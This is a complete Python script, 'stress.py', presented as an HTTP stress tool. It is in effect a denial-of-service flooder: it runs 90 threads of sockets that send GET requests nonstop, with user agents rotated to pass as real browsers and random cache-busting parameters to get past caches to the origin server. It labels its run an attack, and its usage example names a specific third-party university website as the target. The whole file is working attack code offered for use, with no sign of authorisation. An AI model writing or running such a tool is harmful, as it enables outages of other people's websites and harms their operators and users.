#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
stress.py - Raw HTTP GET/POST stress tool (Origin-bypass)
Usage: python3 stress.py <target_url> <duration_seconds>
Example: python3 stress.py https://www.ucv.edu.ph 90
"""

import socket
import ssl
import threading
import time
import sys
import random
import urllib.parse
import platform
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== PLATFORM TWEAKS =====
IS_WINDOWS = platform.system().lower() == "windows"
SOCKET_TIMEOUT = 8.0 if IS_WINDOWS else 5.0

# ===== CONFIG =====
THREADS_PER_WORKER = 45   # 2 workers * 45 = 90 threads
WORKER_COUNT = 2

# Rotating headers to mimic real browsers
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

class RawHTTPStress:
    def __init__(self, url, duration):
        self.parsed = urllib.parse.urlparse(url)
        self.host = self.parsed.hostname
        self.port = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.ssl = self.parsed.scheme == "https"
        self.path = self.parsed.path or "/"
        if self.parsed.query:
            self.path += "?" + self.parsed.query
        self.duration = duration
        self.running = True
        self.total_requests = 0
        self.errors = 0
        self.lock = threading.Lock()
        self.start_time = None

    def build_request(self):
        ua = random.choice(USER_AGENTS)
        # Random cache-buster every request
        cache_buster = f"&_={random.randint(100000, 999999)}" if "?" in self.path else f"?_={random.randint(100000, 999999)}"
        path_with_buster = self.path + cache_buster
        headers = (
            f"GET {path_with_buster} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Accept-Language: en-US,en;q=0.9\r\n"
            f"Cache-Control: no-cache, no-store, must-revalidate\r\n"
            f"Pragma: no-cache\r\n"
            f"Expires: 0\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        return headers.encode()

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(SOCKET_TIMEOUT)
            if IS_WINDOWS:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            if self.ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                context.minimum_version = ssl.TLSVersion.TLSv1_2
                sock = context.wrap_socket(sock, server_hostname=self.host)
            sock.connect((self.host, self.port))
            return sock
        except:
            return None

    def send_request(self, sock):
        req = self.build_request()
        try:
            sock.send(req)
            sock.settimeout(1.0)
            try:
                sock.recv(8192)
            except:
                pass
            with self.lock:
                self.total_requests += 1
            return True
        except:
            with self.lock:
                self.errors += 1
            return False

    def worker_session(self, worker_id):
        sockets = [self.create_socket() for _ in range(THREADS_PER_WORKER)]

        def worker_thread(sock):
            while self.running:
                if sock is None:
                    sock = self.create_socket()
                    if sock is None:
                        time.sleep(0.2)
                        continue
                if not self.send_request(sock):
                    try:
                        sock.close()
                    except:
                        pass
                    sock = None

        threads = []
        for sock in sockets:
            t = threading.Thread(target=worker_thread, args=(sock,))
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.running = False
        for t in threads:
            try:
                t.join(timeout=1)
            except:
                pass
        for sock in sockets:
            try:
                if sock:
                    sock.close()
            except:
                pass

    def run(self):
        print(f"[+] Target: {self.parsed.scheme}://{self.host}:{self.port}{self.path}")
        print(f"[+] Duration: {self.duration}s")
        print(f"[+] Workers: {WORKER_COUNT} x {THREADS_PER_WORKER} threads = {WORKER_COUNT * THREADS_PER_WORKER} total")
        print("[+] Starting stress... (Ctrl+C to stop early)\n")

        self.start_time = time.time()
        # Launch attack in background thread so we can print live updates
        attack_thread = threading.Thread(target=self._run_attack)
        attack_thread.daemon = True
        attack_thread.start()

        # Print attack updates every 10 seconds
        while attack_thread.is_alive():
            time.sleep(10)
            elapsed = time.time() - self.start_time
            with self.lock:
                reqs = self.total_requests
                errs = self.errors
            print(f"[ATTACK] {int(elapsed)}s | Requests: {reqs} | Errors: {errs} | Rate: {reqs/elapsed:.1f}/s")

        # Final summary
        elapsed = time.time() - self.start_time
        with self.lock:
            reqs = self.total_requests
            errs = self.errors
        print("\n[+] Attack finished.")
        print(f"[+] Total requests sent: {reqs}")
        print(f"[+] Total errors: {errs}")
        if elapsed > 0:
            print(f"[+] Requests/sec: {reqs / elapsed:.2f}")
        print("[+] Stress complete.")

    def _run_attack(self):
        with ThreadPoolExecutor(max_workers=WORKER_COUNT) as executor:
            futures = [executor.submit(self.worker_session, i) for i in range(WORKER_COUNT)]
            try:
                for f in futures:
                    f.result()
            except:
                pass

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 stress.py <target_url> <duration_seconds>")
        print("Example: python3 stress.py https://www.ucv.edu.ph 90")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print("[!] Duration must be an integer (seconds)")
        sys.exit(1)

    stress = RawHTTPStress(url, duration)
    stress.run()

if __name__ == "__main__":
    main()
